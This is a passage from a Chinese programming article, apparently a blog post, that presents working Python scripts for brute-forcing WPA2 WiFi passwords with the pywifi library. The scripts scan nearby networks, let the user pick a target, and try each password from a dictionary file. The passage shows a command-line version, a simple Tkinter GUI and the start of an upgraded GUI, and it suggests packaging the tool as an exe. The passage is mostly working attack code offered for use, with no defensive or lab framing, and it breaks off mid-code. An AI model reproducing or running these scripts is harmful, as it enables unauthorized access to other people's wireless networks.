4:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                # 当其处于连接状态时，利用循环等待其断开&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                pass&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 创建连接文件（对象）&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            profile = pywifi.Profile()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # wifi名称&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            profile.ssid = wifi_name&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 需要认证&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            profile.auth = const.AUTH_ALG_OPEN&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # wifi默认加密算法&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            profile.akm.append(const.AKM_TYPE_WPA2PSK)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            profile.cipher = const.CIPHER_TYPE_CCMP&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # wifi密码&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            profile.key = pwd&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 删除所有wifi连接文件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            interface.remove_all_network_profiles()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 设置新的wifi连接文件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            tmp_profile = interface.add_network_profile(profile)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 开始尝试连接&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            interface.connect(tmp_profile)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            start_time = time.time()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            while time.time() - start_time &amp;lt; 1.5:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                if interface.status() == 4:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    print(f&#x27;\r连接成功！密码为：{pwd}&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    exit(0)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                else:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    print(f&#x27;\r正在利用密码 {pwd} 尝试破解。&#x27;, end=&#x27;&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 主函数&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;def main():&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 退出标致&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    exit_flag = 0&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 目标编号&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    target_num = -1&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    while not exit_flag:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        try:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            print(&#x27;WiFi万能钥匙&#x27;.center(35, &#x27;-&#x27;))&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 调用扫描模块，返回一个排序后的wifi列表&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            wifi_list = wifi_scan()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            choose_exit_flag = 0&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            while not choose_exit_flag:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                try:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    target_num = int(input(&#x27;请选择你要尝试破解的wifi：&#x27;))&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    # 如果要选择的wifi编号在列表内，继续二次判断，否则重新输入&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    if target_num in range(len(wifi_list)):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                        # 二次确认&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                        while not choose_exit_flag:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                            try:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                                choose = str(input(f&#x27;你选择要破解的WiFi名称是：{wifi_list[target_num][1]}，确定吗？（Y/N）&#x27;))&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                                # 对用户输入进行小写处理，并判断&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                                if choose.lower() == &#x27;y&#x27;:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                                    choose_exit_flag = 1&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                                elif choose.lower() == &#x27;n&#x27;:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                                    break&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                                # 处理用户其它字母输入&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                                else:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                                    print(&#x27;只能输入 Y/N 哦o(*￣︶￣*)o&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                            # 处理用户非字母输入&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                            except ValueError:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                                print(&#x27;只能输入 Y/N 哦o(*￣︶￣*)o&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                        # 退出破解&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                        if choose_exit_flag == 1:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                            break&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                        else:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                            print(&#x27;请重新输入哦(*^▽^*)&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                except ValueError:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                    print(&#x27;只能输入数字哦o(*￣︶￣*)o&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 密码破解，传入用户选择的wifi名称&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            wifi_password_crack(wifi_list[target_num][1])&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            print(&#x27;-&#x27; * 38)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            exit_flag = 1&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        except Exception as e:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            print(e)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            raise e&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;if __name__ == &#x27;__main__&#x27;:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    main()&lt;/span&gt;&lt;/code&gt;&lt;/section&gt;&lt;/pre&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;脚本运行效果如下：&lt;/span&gt;&lt;br/&gt;&lt;img data-ratio=&quot;0.5296381832178599&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jy6xqzHf1icfluCMyt5kyMIHjhdcyfQcWBGX4TMX0qzKeibc6KZdZNxy4215iaC9swKJvE76LszhC4iag/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1299&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;上述代码实现了依据信号强度枚举当前附近的所有 WIFI 名称，并且可供用户自主选择需要暴力破解的 WIFI，同时还可灵活指定暴力破解的字典，相对而言体验感提升了不少。进一步也可以将上述脚本打包生成 exe 文件，双击运行效果如下：&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img data-ratio=&quot;0.47751430907604253&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jy6xqzHf1icfluCMyt5kyMIHQotxXucnImBxc02b4UFhhOF8ibY1veSNZDvviaz2pMycP4icDyDVyfdrA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1223&quot;/&gt;&lt;/section&gt;&lt;h3&gt;&lt;span&gt;图形化界面&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;下面基于 Python 的 GUI 图形界面开发库 Tkinter 优化上述脚本，实现友好的可视化 WIFI 暴力破解界面工具。&lt;/section&gt;&lt;section&gt;关于 Tkinter 库的语法可参见：&lt;/section&gt;&lt;section&gt;https://www.runoob.com/python/python-gui-tkinter.html&lt;/section&gt;&lt;h2&gt;&lt;span&gt;&lt;strong&gt;简单版UI&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;section class=&quot;code-snippet__fix code-snippet__js&quot;&gt;&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;python&quot;&gt;&lt;section&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;from tkinter import *&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;from pywifi import const&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;import pywifi&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;import time&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 主要步骤：&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 1、获取第一个无线网卡&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 2、断开所有的wifi&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 3、读取密码本&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 4、设置睡眠时间&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;def wificonnect(str, wifiname):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 窗口无线对象&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    wifi = pywifi.PyWiFi()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 抓取第一个无线网卡&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    ifaces = wifi.interfaces()[0]&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 断开所有的wifi&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    ifaces.disconnect()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    time.sleep(1)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    if ifaces.status() == const.IFACE_DISCONNECTED:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 创建wifi连接文件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        profile = pywifi.Profile()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        profile.ssid = wifiname&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # wifi的加密算法&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        profile.akm.append(const.AKM_TYPE_WPA2PSK)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # wifi的密码&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        profile.key = str&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 网卡的开发&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        profile.auth = const.AUTH_ALG_OPEN&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 加密单元,这里需要写点加密单元否则无法连接&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        profile.cipher = const.CIPHER_TYPE_CCMP&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 删除所有的wifi文件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        ifaces.remove_all_network_profiles()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 设置新的连接文件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        tep_profile = ifaces.add_network_profile(profile)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 连接&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        ifaces.connect(tep_profile)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        time.sleep(3)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        if ifaces.status() == const.IFACE_CONNECTED:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            return True&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        else:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            return False&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;def readPwd():&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 获取wiif名称&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    wifiname = entry.get().strip()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    path = r&#x27;./pwd.txt&#x27;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    file = open(path, &#x27;r&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    while True:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        try:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 读取&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            mystr = file.readline().strip()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 测试连接&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            bool = wificonnect(mystr, wifiname)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            if bool:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                text.insert(END, &#x27;密码正确&#x27; + mystr)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                text.see(END)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                text.update()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                file.close()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                break&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            else:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                text.insert(END, &#x27;密码错误&#x27; + mystr)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                text.see(END)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;                text.update()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        except:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            continue&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 创建窗口&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;root = Tk()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;root.title(&#x27;wifi破解&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;root.geometry(&#x27;500x400&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 标签&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;label = Label(root, text=&#x27;输入要破解的WIFI名称：&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 定位&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;label.grid()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 输入控件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;entry = Entry(root, font=(&#x27;微软雅黑&#x27;, 14))&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;entry.grid(row=0, column=1)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 列表控件&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;text = Listbox(root, font=(&#x27;微软雅黑&#x27;, 14), width=40, height=10)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;text.grid(row=1, columnspan=2)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 按钮&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;button = Button(root, text=&#x27;开始破解&#x27;, width=20, height=2, command=readPwd)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;button.grid(row=2, columnspan=2)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# 显示窗口&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;root.mainloop()&lt;/span&gt;&lt;/code&gt;&lt;/section&gt;&lt;/pre&gt;&lt;/section&gt;&lt;section&gt;&lt;br/&gt;&lt;/section&gt;&lt;section&gt;脚本运行效果：&lt;br/&gt;&lt;img data-ratio=&quot;0.8578274760383386&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jy6xqzHf1icfluCMyt5kyMIHicxaLXDiaFMz3ehysWbjyLaU0icwP49LoywYtTY0gZEQNNIib5SlPVntibQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;626&quot;/&gt;&lt;/section&gt;&lt;h2&gt;&lt;span&gt;&lt;strong&gt;UI升级版&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;section&gt;以上图形界面未允许选择密码字典，下面进行优化升级：&lt;/section&gt;&lt;section class=&quot;code-snippet__fix code-snippet__js&quot;&gt;&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;ruby&quot;&gt;&lt;section&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;from tkinter import *&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;from tkinter import ttk&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;import pywifi&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;from pywifi import const&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;import time&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;import tkinter.filedialog  # 在Gui中打开文件浏览&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;import tkinter.messagebox  # 打开tkiner的消息提醒框&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;class MY_GUI():&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    def __init__(self, init_window_name):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.init_window_name = init_window_name&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 密码文件路径&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.get_value = StringVar()  # 设置可变内容&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 获取破解wifi账号&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.get_wifi_value = StringVar()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 获取wifi密码&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.get_wifimm_value = StringVar()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 抓取网卡接口&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.wifi = pywifi.PyWiFi()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 抓取第一个无线网卡&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.iface = self.wifi.interfaces()[0]&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 测试链接断开所有链接&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        self.iface.disconnect()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        time.sleep(1)  # 休眠1秒&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 